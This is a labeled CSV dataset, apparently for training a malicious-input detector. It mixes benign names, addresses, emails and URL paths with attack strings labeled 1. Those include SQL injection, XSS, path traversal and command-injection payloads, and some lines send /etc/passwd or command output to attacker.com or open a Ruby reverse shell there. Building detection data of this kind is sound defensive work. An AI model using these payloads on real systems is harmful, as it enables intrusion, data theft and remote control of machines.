payload,label
hanspete,0
oa,0
6657285532463675,0
/home?token=contact362,0
6785,0
/search?page=hải817,0
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",1
vettenranta@infopromo.az,0
/login?redirect_url=/dashboard/user/92512,0
mcilwraith_sopaporn@barebackspain.info,0
/team/verona/UklmcOUE/statistics,0
g53on3a9u56,0
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",1
18417,0
calle escalona s/n,0
ashberry,0
"-7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
/home?category=book483,0
/login.html?q=kma112,0
calle rosa de los vientos 166 9?a,0
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",1
"1%"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""%""=""",1
7774409448573763,0
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'qcsi'='qcsi",1
baxley@italianmotorvillagesevilla.sh,0
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",1
borrajo,0
/login?redirect_url=/dashboard/user/939962,0
"1"")) as czzg where 5483=5483 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""vhey""=""vhey",1
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
69663934q,0
-7775 or 8571=8571--,1
"1'||(select 'pzoe' where 2977=2977 and elt(3114=3114,sleep(5))#",1
arenas de san juan,0
&& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com,1
1') as rbpx where 1264=1264;begin dbms_lock.sleep(5); end--,1
"urbanizacion girasoles poblachuela, 155, 11?g",0
/login.html?token=shoes507,0
/login?redirect_url=/dashboard/user/626515,0
/team/verona/G1aVOiIp/statistics,0
/api/v1/users?token=profile436,0
rosadelima,0
tris2,0
1'))) rlike sleep(5) and ((('zwyx'='zwyx,1
1' in boolean mode) or 4240=(select 4240 from pg_sleep(5))--,1
/home?token=shoes907,0
ponsati puratic,0
/api/v1/users?user=admin644,0
borrenes,0
"-9156')) union all select 9110,9110,9110,9110#",1
"-1055' union all select 7758,7758,7758,7758,7758,7758--",1
/login?redirect_url=/dashboard/user/784173,0
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf",1
/team/verona/mHpCFyom/statistics,0
3118,0
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",1
/search?q=book892,0
/product/detail?page=2026395,0
0273416778128431,0
hatzenbi5,0
"1'||(select 'lstx' from dual where 2972=2972 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",1
"sol, 153",0
1 where 6036=6036 and 7533=7533--,1
"1"")) as vtad where 3653=3653 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
/product/detail?page=apple475,0
valdearcos de la vega,0
"1')) as ticp where 9794=9794 union all select null,null,null,null,null,null,null,null--",1
caine@albeiteria.es,0
48552,0
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"baixada carme, 165, 3?e",0
hlinka,0
/search?token=12371,0
"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='",1
64733615t,0
/api/v1/auth?token=kOWwit3o,0
paton,0
/login.html?q=profile594,0
cegajoso,0
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('vkde'='vkde",1
'onclick='alert(0x000381)',1
/api/v1/users?page=book193,0
/home?page=kma384,0
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",1
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1) as yduh where 6481=6481 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
16192,0
maurice@salacomplices.ua,0
/api/v1/users?id=shoes591,0
/login?redirect_url=/dashboard/user/669954,0
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'kjfm'='kjfm",1
05240,0
llaguno,0
/api/v1/auth?token=LM56ECRG,0
nebila,0
/login?redirect_url=/dashboard/user/902251,0
"c/ ca n'alzina, 80, 6-b",0
/login.html?q=2026559,0
zarzosa de ro pisuerga,0
&#X00003c;,1
ysero,0
"travesia olmos, s/n 12e",0
/login?redirect_url=/dashboard/user/755533,0
72588518n,0
|| %77%68%6f%61%6d%69,1
"1')) as wkys where 2478=2478 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
|id${y},1
""") OR (""1""=""1",1
/login?redirect_url=/dashboard/user/53317,0
; curl http://attacker.com/?data=$(whoami),1
/api/v1/auth?token=V4adTSCy,0
stroupe,0
/home?user=123549,0
zanobia,0
/api/v1/auth?token=758Ulkdh,0
peng1in,0
reencarnar,0
6884926189160284,0
"-1<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
\ncat /etc/passwd,1
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",1
naestiberger@biogasworld.rs,0
25187,0
9758111869432578,0
neleo,0
sol,0
"c/ juan carlos onetti 4, 1?d",0
zilzer@foreignoffice.fo,0
"1')) union all select null,null,null,null,null,null--",1
brenden,0
05619,0
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
/api/v1/users?token=profile775,0
valencia del mombuey,0
elsen@whitehat.td,0
1) order by 1--,1
1%');begin dbms_lock.sleep(5); end and ('%'=',1
"-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--",1
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1
"| ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",1
'& whoami &',1
estropeo,0
"1) where 1185=1185 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",1
"-8358'))) union all select 7282,7282--",1
bow@whitepearlresort.pl,0
"1'||(select 'rdqv' from dual where 1894=1894;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",1
c/ feria 85,0
a25e7e,0
9607018610591675,0
1') and 4380=5851 and ('cxcl'='cxcl,1
cuevas labradas,0
2904435475269669,0
7447,0
c/ cardenal benilloch 171 12?h,0
-1&& whoami,1
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",1
van_eyk,0
1 and 2620=2175,1
8529,0
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",1
grandlocua,0
"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
95417371p,0
22639557j,0
barruecopardo,0
/login?redirect_url=/dashboard/user/289898,0
/team/verona/uNhaTxlz/statistics,0
/product?id=730598&utm_source=facebook&campaign=sale,0
"1%""));select sleep(5) and ((""%""=""",1
"-1844') union all select 9572,9572,9572,9572#",1
47608,0
arn pola,0
"aljaraque 196, 11d",0
41484237b,0
/product/detail?q=admin425,0
tordelrbano,0
/team/verona/pU8MY3hy/statistics,0
"1',(case when 3598=2118 then 1 else null end)",1
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1
josu,0
|| ping -c 1 $(hostname).attacker.com,1
1))) and (select * from (select(sleep(5)))gcrr)#,1
"1"" and (select * from (select(sleep(5)))fzno)",1
/login.html?page=contact556,0
mukherje,0
/assets/style.css?id=shoes920,0
/login?redirect_url=/dashboard/user/570695,0
81e9604o6o,0
/product?id=177382&utm_source=facebook&campaign=sale,0
5mpe92onal,0
decidir,0
1 and (3437=2271)*2271,1
63a5et5192,0
-7940') union all select 6024--,1
/product/detail?user=2026822,0
/api/v1/auth?token=8mqsUUQN,0
1';begin user_lock.sleep(5); end--,1
/product?id=827522&utm_source=facebook&campaign=sale,0
//1<script>prompt(919397)</script>,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../{file},1
elssser gula,0
/product/detail?category=shoes460,0
-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>,1
Cross Site Scripting Strings Restriction Bypass String to Charcode,1
lage lloris,0
alar1ado0,0
"calle pare joaquim roig s.f. s/n, 2?f",0
SELECT sqlite_version();,1
/team/verona/xZHi1Qt7/statistics,0
/api/v1/auth?token=J5oc0Qjd,0
"plaza cruz caamelar s/n,",0
3496372127518635,0
"10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));"">String:fr",1
97co38225s9,0
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
mckee,0
hervey@annoyanc.eh,0
||||id||||,1
/index.php?id=kma630,0
|| ip addr,1
/product/detail?category=2026142,0
/product/detail?q=shoes224,0
&& ping -c 4 127.0.0.1,1
10960,0
-4322')) as magw where 1627=1627 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
8374f09a2,0
| echo vulnerable,1
"c/ domingo de betanzos s/n,",0
/login?redirect_url=/dashboard/user/969891,0
uresh,0
51620770f,0
"-1197"")) as dfsy where 8857=8857 or 3038=3038",1
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",1
"1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
/login?redirect_url=/dashboard/user/42356,0
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,1
calle laujar 42,0
"<br size=""&{alert('xss')}"">",1
enjoyelada,0
19371,0
"1'||(select 'vpuh' where 8164=8164;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1
"-9180"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
79274775p,0
"1) as udjn where 6871=6871 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
/home?category=contact995,0
2533839429419532,0
"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",1
yazmn,0
/product?id=436456&utm_source=facebook&campaign=sale,0
"torrent de can caralleu 48, 12-g",0
1') as irck where 3660=3660 or (select * from (select(sleep(5)))ydpu)--,1
/login?redirect_url=/dashboard/user/524928,0
nrez muriscot,0
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
/team/verona/uMc0yNMB/statistics,0
32648,0
/index.php?user=2026977,0
"(select (case when (3531=3531) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 3531 end))",1
8n66ies4a,0
tabanera de cerrato,0
"verema 47,",0
livermore-kozlowski@hiteurope.ws,0
|| sleep 5,1
muelas del pan,0
"-9183"") as wctu where 2058=2058 or 3038=3038",1
3218,0
villalgordo del marquesado,0
"1""))) union all select null,null,null,null,null#",1
/api/v1/auth?token=OR4j5WpQ,0
/team/verona/Yv8fwph7/statistics,0
1' where 3337=3337 and 8403=5760,1
"1"";if(7899=7899) select 7899 else drop function zbbp--",1
/api/v1/users?user=profile814,0
/api/v1/users?q=hải71,0
rainelda,0
/team/verona/Xg5uxgg1/statistics,0
song@eyewear.nom.aw,0
"-9208%"")) or 8571=8571--",1
/search?user=book426,0
"1%'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('%'='",1
08030,0
| cat<</etc/passwd,1
/product/detail?id=profile786,0
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('rgue' like 'rgue",1
/product?id=895614&utm_source=facebook&campaign=sale,0
byrska@diagnosticoradiologico.nz,0
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
/home?page=profile77,0
1') where 4277=4277 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
avellanosa de mu,0
"1%' union all select null,null,null,null#",1
tinti@21horas.hr,0
/login?redirect_url=/dashboard/user/3636,0
escamn,0
/api/v1/users?page=shoes539,0
sicotte@sevach.yu,0
marylin,0
4881,0
waldhorn_fregues@prensahp.sn,0
marcanti,0
/search?page=book715,0
06760,0
"1%""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",1
bscones de ojeda,0
; dir,1
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,1
"c/ duran 52,",0
/index.php?token=admin82,0
"calle opera 197,",0
"1%')) union all select null,null,null,null,null,null,null,null--",1
deighton_pfaudler@ajuntamentdebarcelona20.vn,0
"1)) as jmcp where 8624=8624 union all select null,null,null,null,null,null,null,null,null,null--",1
mead-neudorfer4@joyclub.au,0
michell4@so-tel.jobs,0
46942381w,0
/api/v1/auth?token=XjtBqltj,0
1) where 4600=4600 or sleep(5)--,1
-6165%')) union all select 5384#,1
raab,0
silde,0
"1' in boolean mode) and 8635=(select count(*) from generate_series(1,5000000))--",1
/api/v1/users?q=apple988,0
-5258) or (8459=8459)*4906,1
/login.html?user=admin404,0
/team/verona/Ej05Gx8r/statistics,0
/api/v1/auth?token=OMFWB6uA,0
"1 where 1886=1886 union all select null,null,null,null,null,null,null,null,null--",1
4190369223587522,0
/api/v1/auth?token=BgM1Okp8,0
shahab,0
"1"") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>",1
m1n*6848,0
haiti 27 1?g,0
"1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
/team/verona/U02l4TVF/statistics,0
5h5c8,0
/login?redirect_url=/dashboard/user/915256,0
"<xml src=""javascript:document.cookie=true;"">",1
curi piccech,0
/product?id=130555&utm_source=facebook&campaign=sale,0
22728,0
/login.html?page=shoes815,0
lian,0
/search?page=admin42,0
/login?redirect_url=/dashboard/user/976091,0
8049477483692914,0
/home?user=12327,0
"arosa, 117 8?f",0
/login?redirect_url=/dashboard/user/45267,0
/login.html?q=kma864,0
galimany bifet,0
-2936) or 6872=6872,1
-1219') or 5592=4835,1
/login.html?user=apple598,0
adrie,0
"marines, los",0
"1'||(select 'fqoz' where 9794=9794 union all select null,null,null,null,null--",1
' AND 1=2--,1
/login.html?id=apple910,0
/team/verona/TBBqqRUk/statistics,0
"-4588"" union all select 4550,4550,4550,4550#",1
/product?id=803591&utm_source=facebook&campaign=sale,0
"1"")) rlike sleep(5)#",1
carraspeo,0
"1)) as avdz where 1881=1881 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
pradeep,0
1) and (2342=3620)*3620,1
indis6r4cin,0
; /usr/bin/cat /etc/passwd,1
"1%"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",1
/api/v1/users?category=apple975,0
17493,0
"-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr",1
/api/v1/users?q=apple969,0
/team/verona/tditqNiz/statistics,0
"1%""))) union all select null,null,null,null,null,null,null,null,null,null#",1
"1) where 1079=1079;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
48825670m,0
38993479s,0
"calle brasil 185, 11f",0
"-1351"" where 6968=6968 or 5684=8582",1
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
yaonan,0
"1%'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
veronese@prestigecars.tv,0
96378295s,0
/team/verona/qse0KYRR/statistics,0
/index.php?id=hải497,0
camp morante,0
masao,0
"1"") and 6969=(select 6969 from pg_sleep(5)) and (""btht""=""btht",1
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",1
/team/verona/1Kzj814z/statistics,0
kubrick.blessed@suardistec.ee,0
orbita,0
"1');select count(*) from generate_series(1,5000000) and ('cewn'='cewn",1
-6637')) order by 1#,1
santa cruz de la palma,0
/assets/style.css?q=admin455,0
analfabetismo,0
/assets/style.css?token=2026827,0
/home?category=2026796,0
sfiroudi,0
/api/v1/users?id=profile314,0
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1
41570,0
"de l' aliga 3,",0
2ilat9r7a,0
bienvenido,0
"1"";(select * from (select(sleep(5)))acdk)#",1
maas@tobarisch.ke,0
"1"");select pg_sleep(5) and (""tpry""=""tpry",1
/api/v1/auth?token=c0xGAJnA,0
/login.html?category=2026622,0
"1'||(select 'xasp' from dual where 4025=4025 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",1
-3088' or 6872=6872 and 'miwk'='miwk,1
1' and 7533=7533 and 'clqy' like 'clqy,1
55265136t,0
/assets/style.css?category=profile336,0
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
aristteles,0
/product?id=324157&utm_source=facebook&campaign=sale,0
"-8040""))) or make_set(3916=6787,6787) and (((""laar"" like ""laar",1
|| pwd%00,1
1166,0
gerino,0
/login.html?user=apple782,0
/team/verona/0QzaYAkn/statistics,0
/search?user=hải62,0
"1' where 7445=7445 union all select null,null,null,null,null,null--",1
/home?q=book78,0
16856,0
chinarro,0
ribera del fresno,0
/login?redirect_url=/dashboard/user/235,0
/product/detail?category=profile386,0
nithsdale.livanov@blanquillos.mo,0
castello7,0
left:expression(eval(alert(1))),1
/login?redirect_url=/dashboard/user/154841,0
mccreano,0
"1 where 1519=1519;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
/product?id=178454&utm_source=facebook&campaign=sale,0
"-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1
8r2s94a,0
12354547m,0
segundo,0
/login?redirect_url=/dashboard/user/361720,0
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",1
& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00,1
aguijon!ear,0
/api/v1/auth?token=wMWjQ2ET,0
02877417w,0
zayas vadillo,0
"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",1
"jardines, 110",0
/............................{file},1
"1%"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""%""=""",1
/login?redirect_url=/dashboard/user/615881,0
acabadamente,0
olimpia,0
goubanov@delujos.bg,0
368,0
11693,0
/index.php?id=hải974,0
"-4705' where 2029=2029 union all select 2029,2029,2029#",1
"""><img src=x.png onerror=prompt(""XSS"");>",1
byrgesen,0
"calle padre payan 127,",0
/login?redirect_url=/dashboard/user/695106,0
steinfeld@multireform.sg,0
"1')));select * from generate_series(9709,9709,case when (9709=7795) then 1 else 0 end) limit 1--",1
/login.html?id=kma287,0
/../..//../..//../..//..///{file},1
/product?id=714056&utm_source=facebook&campaign=sale,0
/login?redirect_url=/dashboard/user/643389,0
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""oiuw""=""oiuw",1
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
verney,0
/index.php?q=shoes811,0
6545971193644202,0
/api/v1/auth?token=EgAxd3EF,0
cap!tar,0
"calle muelles, 70, 6g",0
3781036501381167,0
"1%"") or sleep(5)#",1
18300,0
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
"avenida constitucion espaola, 135,",0
desnudez,0
/product?id=674760&utm_source=facebook&campaign=sale,0
calaceite,0
7362218101347433,0
/login?redirect_url=/dashboard/user/264280,0
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
gwenda,0
"1"")) as aamh where 7432=7432 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
/login?redirect_url=/dashboard/user/858579,0
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#",1
9695488884758445,0
17850,0
/team/verona/b2m34VxX/statistics,0
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq",1
oposicionist3,0
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>",1
2689,0
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,1
ohmaru,0
"1'||(select 'vsfg' where 3547=3547 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",1
/index.php?token=shoes759,0
"-2625') or elt(1032=1032,3623) and ('eliy'='eliy",1
29716,0
/api/v1/auth?token=mHrYcZ5a,0
/api/v1/auth?token=PaiGFzO8,0
6991,0
| cat /etc/passwd,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,1
26288,0
"1%')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('%'='",1
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu",1
/index.html|id|,1
alfaro,0
/home?id=profile584,0
brooking-doolittle@encuentrodominios.lv,0
/product?id=257163&utm_source=facebook&campaign=sale,0
/product?id=809007&utm_source=facebook&campaign=sale,0
kernke-langevin@estoeslahostia.kr,0
/login?redirect_url=/dashboard/user/805940,0
"1%"")) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",1
"1%"")));select count(*) from generate_series(1,5000000)--",1
/login.html?token=2026386,0
brun canalis,0
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('ichh' like 'ichh",1
/product?id=516557&utm_source=facebook&campaign=sale,0
"1"")) as luon where 4676=4676 rlike sleep(5)#",1
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",1
14640,0
"1' in boolean mode) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)#",1
"1"")) as xtlt where 9293=9293;select case when 7717=7717 then 1 else null end--",1
ittaly,0
/product/detail?token=apple272,0
beneit pao,0
/team/verona/Y0nZhRvn/statistics,0
"<img lowid=xss src=""javascript:alert('xss')"">",1
sebastian_ferdi@tintaultravioleta.mv,0
22470,0
/product?id=791064&utm_source=facebook&campaign=sale,0
abarraganamiento,0
chueca,0
/search?id=123417,0
/product/detail?category=admin156,0
/login.html?token=book697,0
| `echo pwd`,1
sansalva farreron,0
-4001')) or 5634=4044--,1
/product/detail?q=admin702,0
/home?page=shoes215,0
23593437z,0
|id 2>/dev/null,1
"1 union all select null,null,null#",1
aida 184,0
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('khah' like 'khah",1
"c/ la figuera 63,",0
delsa,0
j0ctar,0
reski.kuberskaya@n340magazin.no,0
butarinski_sawyer@proofreader.fj,0
brittni,0
cuartn,0
isunza,0
/api/v1/auth?token=9QmbmTUM,0
"1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",1
berghof@esbien.bt,0
/product/detail?category=kma586,0
& curl http://example.com/shell.sh,1
margheti,0
8251009613844272,0
chen@testevelocidad.nl,0
1))) and 8990=4775 and (((1894=1894,1
manises,0
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('qgdv'='qgdv",1
/product?id=877739&utm_source=facebook&campaign=sale,0
ceg.ama,0
05130,0
/assets/style.css?category=hải844,0
/api/v1/auth?token=FaMwnbUz,0
byoung,0
$embrutecimiento,0
yan-zhen,0
/login?redirect_url=/dashboard/user/120048,0
/product/detail?token=book280,0
/team/verona/1GtIDJdF/statistics,0
"1"")) and elt(1210=1210,sleep(5)) and ((""utlk"" like ""utlk",1
"1"") as kfvy where 7305=7305 or sleep(5)--",1
|| ls -la | curl -X POST -d @- http://attacker.com,1
a98a60az90,0
<script itworksinallbrowsers>/*<script* */alert(1)</script,1
/api/v1/users?page=book809,0
/search?category=contact669,0
/login.html?category=book734,0
